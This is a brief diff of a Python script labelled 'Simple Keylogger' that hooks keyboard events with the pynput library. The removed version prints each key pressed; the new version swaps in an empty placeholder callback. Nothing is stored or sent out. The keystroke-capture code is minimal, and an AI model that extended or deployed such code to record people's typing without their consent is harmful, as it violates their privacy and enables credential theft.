@@ -1,11 +1,10 @@
 # Simple Keylogger
 from pynput.keyboard import Listener
 
-def changed(key):
-	print("key - ", key, ' is pressed')
+def function(*args, **kwargs):...
 
-def on_press(function=changed):
-	with Listener(function) as l:
+def on_press(callback=function):
+	with Listener(callback) as l:
 		try:
 			l.join()
 		except KeyboardInterrupt:
